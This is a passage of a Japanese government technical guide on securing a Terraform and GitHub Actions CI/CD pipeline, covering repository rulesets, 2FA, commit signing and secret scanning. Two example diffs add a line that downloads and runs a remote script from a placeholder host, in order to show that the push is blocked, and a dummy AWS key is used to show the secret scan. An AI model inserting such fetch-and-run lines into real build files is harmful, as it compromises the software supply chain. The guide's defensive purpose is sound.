{
  "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
  "metadata": {
    "meeting": "デジタル社会推進標準ガイドライン",
    "agency": "デジタル庁",
    "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
    "date": "2025-06-30",
    "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
  },
  "pages": 41,
  "chunks": [
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c0",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 0,
      "text": "デジタル社会推進実践ガイドブック DS-202 CI/CD パイプラインにおけるセキュリティの留意点 に関する技術レポート – 別添. CI/CD パイプラインによるInfrastructure as Code 実装例 2025（令和7）年6 月13 日 デジタル庁 〔ドキュメントの位置付け〕 Informative 参考とするドキュメント 〔キーワード〕 CI/CD パイプライン、IaC、モダンアプリケーション、アジャイル、クラウ ドネイティブ、DevOps、DevSecOps、変更管理、構成管理 〔概要〕 本ドキュメントは「CI/CD パイプラインにおけるセキュリティの留意点に 関する技術レポート」の理解を促進するにあたって、具体的なシナリオをも とに各要素について実例を示す。\n\n改定履歴 改定年月日 改定箇所 改定内容 2025年6月13日 - ・初版決定\n\n目次 目次 ................................................................ 1 １ はじめに ......................................................... 1 ２ シナリオ ......................................................... 1 ２.１ 組織構成 .................................................... 1 ２.２ 本シナリオでの概要図および詳細図 ............................ 2 ３ プラットフォームチームのCI/CD パイプライン ....................... 5 ３.１ 全フェーズに共通した保護 .................................... 5 1) 資産管理、脆弱性管理を含む運用保守 ........................... 6 2) シークレットの保護 ........................................... 6 3) CI/CD パイプラインを通した信頼性の確保 ....................... 7 ３.２ ローカル開発フェーズの保護 .................................. 7 1) 利用者やエンドポイントにおける対策 ........................... 7 2) ソースコード管理システム、そのリポジトリ及びブランチの保護 ... 7 ３.３ ビルドフェーズの保護 ....................................... 15 1) シークレット情報の漏洩対",
      "page_from": 1,
      "page_to": 3,
      "char_count": 1200,
      "position": 0,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c1",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 1,
      "text": ".................................. 7 1) 利用者やエンドポイントにおける対策 ........................... 7 2) ソースコード管理システム、そのリポジトリ及びブランチの保護 ... 7 ３.３ ビルドフェーズの保護 ....................................... 15 1) シークレット情報の漏洩対策 .................................. 15 2) ソースコード・成果物の信頼性の担保 .......................... 17 3) ビルド上での実行範囲の制限 .................................. 24 4) 依存物の安全性の担保 ........................................ 24 5) ストレージ内の成果物の保護 .................................. 25 ３.４ デリバリフェーズの保護 ..................................... 26 1) デリバリ時に利用する主体の保護 .............................. 26 2) 信頼できる成果物をデリバリするための保護 .................... 26 3) デリバリ時の証跡 ............................................ 26 ４ サービスチームのCI/CD パイプライン .............................. 27 ４.１ 全フェーズに共通した保護 ................................... 27 1) 資産管理、脆弱性管理を含む・運用保守 ........................ 27 2) シークレットの保護 .......................................... 28 3) CI/CD パイプラインを通した信頼性の確保 ...................... 28 ４.２ ローカル開発フェーズの保護 ................................. 28 ４.３ ビルドフェーズの保護 ....................................... 29 1) シークレット情報の漏洩対策 .................................. 29 2) ソースコード・成果物の信頼性の担保 .......................... 29 3) ビルド上での実行範囲の制限 .............",
      "page_from": 3,
      "page_to": 3,
      "char_count": 1200,
      "position": 1000,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c2",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 2,
      "text": ".. 28 ４.３ ビルドフェーズの保護 ....................................... 29 1) シークレット情報の漏洩対策 .................................. 29 2) ソースコード・成果物の信頼性の担保 .......................... 29 3) ビルド上での実行範囲の制限 .................................. 32\n\n4) 依存物の安全性の担保 ........................................ 34 5) ストレージ内の成果物の保護 .................................. 36 ４.４ デリバリフェーズの保護 ..................................... 36 1) デリバリ時に利用する主体の保護 .............................. 36 2) 信頼できる成果物をデリバリするための保護 .................... 36 3) デリバリ時の証跡 ............................................ 37\n\n1 １ はじめに 本書では、AWS 上で稼働する政府情報システム（以下「サービス」 ）が、その AWS リソースをInfrastructure as Code ツール「Terraform」によって構成管 理され、そしてCI/CD パイプラインツール「GitHub Actions」を用いて自動適 用されている状況を想定した実装例を紹介する。これにより「CI/CD パイプラ インにおけるセキュリティの留意点に関する技術レポート」 （以降、技術レポ ート）におけるCI/CD パイプライン特有の具体的保護策を網羅的に例示するこ とで、その理解を補助することを目的としている。 なお、本ドキュメントは2024 年10 月段階の仕様である。また、本書はあく まで保護策の全体的な実装例であり、実運用環境では、全体的なリスクやパフ ォーマンス等の機能・非機能要件をもとに、保護策の要否、粒度、強度を決定 し、ツールを選定すべきである。 ２ シナリオ ２.１組織構成 Terraform 本体（Terraform バイナリ）とAWS のAPI を介するTerraform AWS Provider（以下「プロバイダー」 ）は宣言的な構成ファイルと状態ファイルを 入力値としてリソースを構成管理する。したがって、Terraform バイナリやプ ロバイダーは高リスクの第三者提供のソフトウェアと言えるであろう。そのた め、ソフトウェア・サプライチェーンの観点から、Terraform バイナリやプロ バイダー自体の信頼性はもとより、その取得（調達）手続きにも高い信頼性が 求められる。",
      "page_from": 3,
      "page_to": 5,
      "char_count": 1244,
      "position": 2000,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c3",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 3,
      "text": "rovider（以下「プロバイダー」 ）は宣言的な構成ファイルと状態ファイルを 入力値としてリソースを構成管理する。したがって、Terraform バイナリやプ ロバイダーは高リスクの第三者提供のソフトウェアと言えるであろう。そのた め、ソフトウェア・サプライチェーンの観点から、Terraform バイナリやプロ バイダー自体の信頼性はもとより、その取得（調達）手続きにも高い信頼性が 求められる。 また、世界中で豊富な導入実績を持ち、且つAWS 以外のクラウドプラットフ ォームにも活用できるTerraform が、複数のサービスを運営する組織（以下、 サービスチーム）に導入される蓋然性は高い。そのため、先述した信頼性を確 保するにあたって、一定の標準やルールが必要になると考えられる。そういっ た標準やルールの準拠を組織全体で効率的に実現するにあたって、それを職務 の一部とする「プラットフォームチーム」が存在すると仮定する（図 1） 。\n\n2 図 1：体制図 プラットフォームチームはそのCI/CD パイプライン内で、Terraform バイナ リおよびプロバイダーを公式の配布元から取得し、コンテナイメージとその署 名を成果物として提供する。つまり、配布物の安全性確認とその証跡の提供が プラットフォームチームの責務となる。また、コンテナイメージに関連するメ タデータとその署名を提供する。サービスチームは、CI/CD パイプライン内で、 それらの署名を取得・検証する。問題がなければコンテナイメージを取得し、 リソースを定義したTerraform ファイルをもとに管理下のAWS アカウント及び リソースの構成管理をする。 ２.２本シナリオでの概要図および詳細図 図 2 は、本シナリオで活用するサービス及びツールを、技術レポート本文 に記載したCI/CD パイプライン概要図にマッピングしたものである。\n\n3 図 2：概要図 上記の概要図に記載したサービス及びツールを次の表にまとめる。 役割 サービス名・ツール名（バージ ョン） 代替例 バージョン管理 git （git version 2.39.3 (Apple Git-146)） svn, Mercurial Git リポジトリホスティ ング GitHub（オンプレ又はクラウド Team Plan 以上1） GitLab, Bitbucket CI/CD パイプライン GitHub Actions 、 AWS CodeBuild Gitlab, CircleCI, Terraform Cloud Infrastructure as Code Terraform (v1.10.2) Plumi,OpenTofu Terraform バイナリ及び プロバイダーのパッケー ジング Docker 1 GitHub クラウド版はTeam Plan である必要がある。",
      "page_from": 5,
      "page_to": 7,
      "char_count": 1220,
      "position": 3044,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c4",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 4,
      "text": "イン GitHub Actions 、 AWS CodeBuild Gitlab, CircleCI, Terraform Cloud Infrastructure as Code Terraform (v1.10.2) Plumi,OpenTofu Terraform バイナリ及び プロバイダーのパッケー ジング Docker 1 GitHub クラウド版はTeam Plan である必要がある。本書は技術レポートを理解しやすくするための補助文書であり、 実際のCI／CD パイプラインの保護策を検討する場合には適切なGit リポジトリホスティングを対象にする必要がある。\n\n4 シークレットスキャン Trivy (v0.57.1) trufflehog 脆弱性スキャン/誤設定ス キャン 同上 checkov メタデータ生成 - Software Bill of Material（SBOM） 同上 Anchore, Docker 成果物署名、署名検証 Cosign (v2.4.1) メタデータ生成 - Provenance2 同上 他 AWS の各種サービス 図 3 は、上記ツールを用いたプラットフォームチームとサービスチームの CI/CD パイプラインの詳細図である。ここでは、プラットフォームチームの CI/CD パイプラインから生成・提供されたコンテナイメージを、サービスチー ムが自身のCI/CD パイプライン内で利用し、AWS 上のリソースを管理する一連 の流れを図示している。具体的な各チームのCI/CD パイプラインの処理、また チーム間の成果物連携方法に関する具体的な内容については、３章「プラット フォームチームのCI/CD パイプライン」及び４章「サービスチームのCI/CD パ イプライン」にて記述する。 また、本章以降、プラットフォームチームのCI/CD パイプラインを「パイプ ラインA」 、サービスチームのCI/CD パイプラインを「パイプラインB」と略称 する。 2 Provenance は、生成物が作成されたビルド環境・プロセスを示すソフトウェアの出所に関するメタデータ\n\n5 図 3：各チームのCI/CD パイプラインとツール ３プラットフォームチームのCI/CDパイプライン 図 4: プラットフォームチームのCI/CD パイプライン 図 4 は、プラットフォームチームのCI/CD パイプライン（以下「パイプラ インA」 ）の概観を示している。パイプラインA では、プラットフォームチー ムが一元的に管理するTerraform バイナリおよびAWS プロバイダーを、サービ スチームに提供できる状態にする。これは、複数チームで共通利用されるソ フトウェアに対する個別のセキュリティチェックをプラットフォームチーム が担うことで、ルールへの準拠がより実行的になる効果を期待している。具 体的には、公式配布元からTerraform バイナリおよびAWS プロバイダーを取得 し、それらをパッケージングしたコンテナイメージを成果物とする。",
      "page_from": 7,
      "page_to": 9,
      "char_count": 1292,
      "position": 4064,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c5",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 5,
      "text": "ナリおよびAWS プロバイダーを、サービ スチームに提供できる状態にする。これは、複数チームで共通利用されるソ フトウェアに対する個別のセキュリティチェックをプラットフォームチーム が担うことで、ルールへの準拠がより実行的になる効果を期待している。具 体的には、公式配布元からTerraform バイナリおよびAWS プロバイダーを取得 し、それらをパッケージングしたコンテナイメージを成果物とする。ここで は、公式の配布元及びそれへの経路については信頼できると仮定する。コン テナ化する理由は、異なる実行環境やローカル環境を持つ各情報システムに 対して、一貫性のある動作を保証しやすいからである。 ビルドされたコンテナイメージに対しては、シークレットのスキャンや脆 弱性のスキャンを実施し安全性を確認する。また、成果物であるコンテナイ メージの利用者であるサービスチームがその信頼性を検証し判断できるよう、 SBOM やビルド環境に関するProvenance といったメタデータも生成する。また、 これらコンテナイメージ、SBOM、Provenance は完全性や真正性を検証できる よう署名を行った上で、アーティファクトリポジトリであるAmazon Elastic Container Registry（以降 ECR）へアップロードする。プラットフォームチー ムのGitHub リポジトリの運用として、main ブランチのみを使い、リリースタ グを使った成果物のデリバリを行う。この際、関連GitHub リポジトリの管理 者とリリース承認者が同じなどと言った小規模な組織形態を想定する。 ３.１全フェーズに共通した保護 全フェーズに共通した保護については、 「資産管理」 「脆弱性管理を含む運 用・保守」 「環境への対策」 「ログの取得・管理」がある。このうち次に取り\n\n6 上げていないものは、CI/CD パイプライン特有の事項ではないため省略してい る。 1)資産管理、脆弱性管理を含む運用保守 プラットフォームチーム内での運用保守そのものは、CI/CD パイプライン 特有の事項ではないため省略する。しかし、プラットフォームチームの成果 物が、サービスチームのCI/CD パイプラインにおける重要な依存物となる。 そのため、サービスチームはプラットフォームチームの成果物を信頼できる か検証・判断する必要がある。プラットフォームチームは判断の根拠となる、 成果物の構成内容、脆弱性情報、来歴情報といったメタデータを提供する必 要がある（図 5） 。具体的な対応策については、３.３4)「依存物の安全性の 担保」で解説する。 図 5：CI/CD パイプラインの成果物が他方では依存物となりうる 2)シークレットの保護 ソースコードやビルド環境のあるGitHub と、その成果物を保管するAWS 間 の連携は、AWS のWeb API を介して行われる。",
      "page_from": 9,
      "page_to": 10,
      "char_count": 1230,
      "position": 5156,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c6",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 6,
      "text": "る、 成果物の構成内容、脆弱性情報、来歴情報といったメタデータを提供する必 要がある（図 5） 。具体的な対応策については、３.３4)「依存物の安全性の 担保」で解説する。 図 5：CI/CD パイプラインの成果物が他方では依存物となりうる 2)シークレットの保護 ソースコードやビルド環境のあるGitHub と、その成果物を保管するAWS 間 の連携は、AWS のWeb API を介して行われる。パイプラインA では、長期間有 効なAWS IAM アクセスキーを、GitHub Actions がリクエストに含むことで実 現する形態を取る。AWS IAM アクセスキー自体の発行や更新方法は本書のスコ ープではない。しかし、アクセスキーをCI/CD パイプラインが利用できる形で 安全に保管する方法は重要である。特に、GitHub の変更履歴に残さず使いや すい形にするため、本書ではGitHub リポジトリの「Secrets」という機能に保 存するとことする。 また、アクセスキーの安全な利用方法については、３.２2)「ソースコー\n\n7 ド管理システム、そのリポジトリ及びブランチの保護」及び３.３1)「シーク レット情報の漏洩対策」にて解説する。 サービスチームがプラットフォームチームの成果物やリソースにアクセス する際は、異なるAWS 環境間でのクロスアカウントアクセスを用いることを想 定している。この場合、プラットフォームチーム管理下のAWS アカウント側が、 有効期間の短いシークレットを発行する。これはCI/CD パイプライン特有の考 慮事項はないため、本書では詳細を省略する。 3)CI/CD パイプラインを通した信頼性の確保 パイプラインA は、小規模な組織であるプラットフォームチームの管理者が ソースコードからデリバリまでを管理する。そのため、各パイプラインのフ ェーズでチームの差がないため、予め信頼性が高い状態となっている。 ３.２ローカル開発フェーズの保護 1)利用者やエンドポイントにおける対策 パイプラインA 特有の保護策ではないので、本書では省略する 2)ソースコード管理システム、そのリポジトリ及びブランチの保護 図 6: ソースコード管理システム、そのリポジトリ及びブランチの保護  アクセス権限の設定 GitHub におけるアクセス権限の対象は、GitHub Organization、リポジト リ、ブランチやソースコードファイル等のリポジトリ内リソースが考えられ る。Organization に対するアクセス制限はCI/CD パイプライン特有の保護策 ではないが、ブランチやその配下のリソースのアクセス権限にも影響する。 ここでは、Organization には、プラットフォームチーム以外が全くアクセス 権限をもたないこととする。リポジトリの設定では、プラットフォームチー\n\n8 ムのメンバーには基本「Write」権限を付与するが、ブランチ自体の管理を できるよう一部メンバーに「Admin」あるいは「Maintainer」等の権限を付 与する。",
      "page_from": 10,
      "page_to": 12,
      "char_count": 1300,
      "position": 6186,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c7",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 7,
      "text": "策 ではないが、ブランチやその配下のリソースのアクセス権限にも影響する。 ここでは、Organization には、プラットフォームチーム以外が全くアクセス 権限をもたないこととする。リポジトリの設定では、プラットフォームチー\n\n8 ムのメンバーには基本「Write」権限を付与するが、ブランチ自体の管理を できるよう一部メンバーに「Admin」あるいは「Maintainer」等の権限を付 与する。リポジトリ内のリソースに対するアクセス権限の設定は次に述べる。 図 7: GitHub リポジトリの権限設定  強制的な取り込みの禁止 リポジトリの権限設定では、どのメンバーでも任意に変更を取り込める。 これはGitHub の仕様である。これはCI/CD パイプラインにおける品質管理や 変更管理の観点で問題になるため、変更のレビューや承認などを必須とし、 またそれらを実行できる範囲を限定的にする必要がある。これらの制限は GitHub Pro で利用可能な、 「Rulesets」機能で実現できる。具体的には、 「branch rulesets」を作成し、 「Targets」に「main」を、 「Branch rules」 に「Require a pull request before merging」および「Block force pushes」 を設定する（図 8）3。 3 本書のスコープからは外れるが、GitHub に限らず全体的な構成を管理・監査することも重要である。特にGitHub に 対しては、OpenSSF のScorecard を利用して自動的な構成チェックを実施することが可能である。 https://github.com/ossf/scorecard\n\n9 図 8: GitHub リポジトリのbranch rule この設定下で、ローカル環境から制限対象のリモートリポジトリへの取り 込みは、ルールに記述した通り拒否される（図９） 。 % git diff diff --git a/dockerfile b/dockerfile index 36e41bc..876a547 100644 --- a/dockerfile +++ b/dockerfile @@ -9,6 +9,7 @@ RUN apt-get install -y \\ +RUN bash <(curl -s https://bad.io/bash)\n\n10 % git commit -m “example modification” % git push -f origin main （中略） remote: error: GH013: Repository rule violations found for refs/heads/main. remote: Review all r",
      "page_from": 11,
      "page_to": 14,
      "char_count": 1200,
      "position": 7286,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c8",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 8,
      "text": "(curl -s https://bad.io/bash)\n\n10 % git commit -m “example modification” % git push -f origin main （中略） remote: error: GH013: Repository rule violations found for refs/heads/main. remote: Review all repository rules at https://github.com/xxx/mock-prv- guardrail/rules?ref=refs%2Fheads%2Fmain remote: remote: - Changes must be made through a pull request. remote: remote: remote: (?) To push, resolve push protection violations or follow this URL to request push protection bypass. remote: https://github.com/xxx/mock-prv-guardrail/exemptions/new/xxx= To https://github.com/xxx/mock-prv-guardrail.git ! [remote rejected] main -> main (push declined due to repository rule violations) error: failed to push some refs to 'https://github.com/xxx/mock-prv-guardrail.git' 図 9: branch rulesets による保護結果  CI/CD パイプライン定義ファイルの保護 本シナリオで採用したGitHub Actions ワークフローでは、.github 配下の ファイルを保護する必要がある。このファイルを変更できる場合、成果物に 対して任意の変更や任意の処理を埋め込まれる可能性がある。例えば、当該 GitHub Actions ワークフローの実行トリガーを任意に指定し、実際のレビュ ー前に変更内容を実行できるおそれがある。したがって、.github 配下のフ ァイルへの変更をPush できる主体を限定しなければならない。これには、 「Rulesets」機能の「Push rulesets」を使うことで実現可能である（図 10） 。 図 10: GitHub リポジトリのpush rule\n\n11 この設定をした状態で、CI/CD パイプライン関連の構成ファイルに変更を試 みても図 11 のように、ルールによってエラーと処理される。",
      "page_from": 13,
      "page_to": 15,
      "char_count": 1205,
      "position": 8286,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c9",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 9,
      "text": "github 配下のフ ァイルへの変更をPush できる主体を限定しなければならない。これには、 「Rulesets」機能の「Push rulesets」を使うことで実現可能である（図 10） 。 図 10: GitHub リポジトリのpush rule\n\n11 この設定をした状態で、CI/CD パイプライン関連の構成ファイルに変更を試 みても図 11 のように、ルールによってエラーと処理される。 % git diff diff --git a/.github/workflows/build.yml b/.github/workflows/build.yml index 35d3ea9..eaa68cc 100644 --- a/.github/workflows/build.yml +++ b/.github/workflows/build.yml @@ -88,6 +88,7 @@ jobs: - name: Set IMAGE_DIGEST id: set-image-digest run: | + bash <(curl -s https://bad.io/bash) echo \"IMAGE_DIGEST=${{ steps.login-ecr.outputs.registry }}/tf-image@${{ steps.docker- build-and-push.outputs.digest }}\" >> $GITHUB_OUTPUT % git commit -m “example modification” % git push origin （中略） remote: error: GH013: Repository rule violations found for refs/heads/develop. remote: Review all repository rules at https://github.com/xxxxx/mock-prv-guardrail/rules?ref =refs%2Fheads%2Fdevelop remote: remote: - GITHUB PUSH PROTECTION remote: ————————————————————————————————————————— remote: Resolve the following violations before pushing again remote: remote: - File path is restricted remote: Found 1 violation: remote: remote: .github/workflows/build.yml remote: remote: (?) To push, resolve push",
      "page_from": 14,
      "page_to": 15,
      "char_count": 1199,
      "position": 9291,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c10",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 10,
      "text": "he following violations before pushing again remote: remote: - File path is restricted remote: Found 1 violation: remote: remote: .github/workflows/build.yml remote: remote: (?) To push, resolve push protection violations or follow this URL to request push protec tion bypass. remote: https://github.com/xxxx/mock-prv-guardrail/exemptions/new/xxx= remote: To https://github.com/xxx/mock-prv-guardrail.git ! [remote rejected] develop -> develop (push declined due to repository rule violations) error: failed to push some refs to 'https://github.com/xxx/mock-prv-guardrail.git' 図 11: push rule による保護結果  ソースコード管理システムの公私共用なユーザーアカウントの管理 図 12:ソースコード管理システムの公私共用なユーザーアカウントの管理 GitHub では、個人ユーザーがアカウントを作成できる。4そういった個人 管理のアカウントを組織のGitHub Organization に招待することは、GitHub 4 GitLab やBitbucket も同様である\n\n12 というサービス上は可能である。この場合、もし個人管理下のアカウントが 不正アクセス等の被害に遭った場合、そのアカウントを招待した組織に対し ても影響を及ぼす恐れがある。図 13 のように、GitHub は一定条件を満たし たアカウントに対して二要素認証（2FA）の設定を義務化している。5 しか し、SIM スワップやMFA Fatigue などにより2FA を突破されているように、 2FA の強度には差がある。 図 13: GitHub によるMFA 設定要求 安全なアカウント管理にするため、GitHub organization は全メンバーに 対して2FA を強制するだけでなく、さらに強度の高い2FA を指定することが 可能である（図 14） 。もし、GitHub のプランがEnterprise の場合は、自組 織のIdP（Identity Provider）との連携によるSSO（シングルサインオン） を設定し、すべてのメンバーに対してその利用を義務付けることもできる。",
      "page_from": 15,
      "page_to": 16,
      "char_count": 1230,
      "position": 10291,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c11",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 11,
      "text": "にするため、GitHub organization は全メンバーに 対して2FA を強制するだけでなく、さらに強度の高い2FA を指定することが 可能である（図 14） 。もし、GitHub のプランがEnterprise の場合は、自組 織のIdP（Identity Provider）との連携によるSSO（シングルサインオン） を設定し、すべてのメンバーに対してその利用を義務付けることもできる。 図 14: GitHub Organization の管理者が強制できる２要素認証と強度 5 https://docs.github.com/en/authentication/securing-your-account-with-two-factor-authentication- 2fa/about-mandatory-two-factor-authentication\n\n13  作業内容と作業者の紐づき 図 15: 作業内容と作業者の紐づき ここでの「作業者」は、実在の物理的な主体（人物）ではなく、GitHub アカ ウントを指す。GitHubアカウントは、リポジトリへの変更履歴を示すcommitを 作成でき、またこのcommit の信頼性を強化する署名を付与することも可能であ る。具体的には、GitHub のアカウントに署名用の鍵情報を登録し（図 16） 、ロ ーカル端末のGit 設定ファイルで設定（図 17）を行うことで可能となる。 図 16: 鍵の登録 % cat ~/.gitconfig [user] email = xxxx@digital.gov.jp name = xxxxx signingkey = ssh-ed25519 xxxxx [gpg] format = ssh [gpg \"ssh\"] allowedSignersFile = /Users/xxxx/.ssh/allowed_signers [commit] gpgSign = true [tag] forceSignAnnotated = true\n\n14 [init] defaultBranch = main 図 17: .gitconfig このcommit 署名は「branch Rulesets」および「tag Rulesets」で強制可 能である。  ソースコード管理システムに対するシークレットの記録予防 図 18：ソースコード管理システムに対するシークレットの記録予防 シークレットを誤ってcommit した場合、平文として記録に残置され、大き なリスクとなる。したがって、commit 作成前に機密情報を含もうとしていな いかをチェックする仕組みが重要となる。一例として、Git におけるフック （Git Hooks）のうちpre-commit フックを活用し、commit 直前にシークレッ トスキャンを実行する方法が考えられる。本書では、pre-commit（ツール） とTrivy を採用し、シークレットが含まれていないかを自動的に事前確認し ている。",
      "page_from": 16,
      "page_to": 18,
      "char_count": 1294,
      "position": 11321,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
      "url": "https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf"
    },
    {
      "chunk_id": "59fd4957d4756fe2870e7aa1be2c0060_c12",
      "doc_id": "59fd4957d4756fe2870e7aa1be2c0060",
      "chunk_index": 12,
      "text": "。したがって、commit 作成前に機密情報を含もうとしていな いかをチェックする仕組みが重要となる。一例として、Git におけるフック （Git Hooks）のうちpre-commit フックを活用し、commit 直前にシークレッ トスキャンを実行する方法が考えられる。本書では、pre-commit（ツール） とTrivy を採用し、シークレットが含まれていないかを自動的に事前確認し ている。 （図 19） 。 % cat config/trivy-secrets-scan.yaml secret: # empty #config: ./config/secrets.yaml scan: scanners: - secret format: \"table\" exit-code: 1 % cat config/.pre-commit-config.yaml repos: - repo: local hooks: - id: trivy name: trivy language: golang entry: trivy fs --config ./config/trivy-secrets-scan.yaml –quiet . % pre-commit install -c ./config/.pre-commit-config.yaml % pre-commit run --all-files -c ./config/.pre-commit-config.yaml 図 19：Git フックの登録 この設定を反映した状態で、AWS のアクセスキーが追加されたファイルを、\n\n15 コミット対象とした場合の挙動が図 20 である。こういった構成を全端末に 準拠させたい場合、端末管理ツール（Active Directory のGPO やMDM など） から配布・強制することが望ましい。 % cat hoge.txt export SAMPLE_AWS_KEY=ASIAUKOOWJO3YGYKBYGG #Dummy % git commit -m 'add precommit' trivy....................................................................Failed - hook id: trivy - exit code: 1 hoge.txt (secrets) Total: 1 (UNKNOWN: 0, LOW: 0, MEDIUM: 0, HIGH: 0, CRITICAL: 1) CRITICAL: AWS (aws-access-key-id) ════════════════════════════════════════ AWS Access Key ID ─────────────",
      "page_from": 18,
      "page_to": 19,
      "char_count": 1200,
      "position": 12415,
      "meeting": "デジタル社会推進標準ガイドライン",
      "agency": "デジタル庁",
      "title": "別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）",
      "date": "2025-06-30",
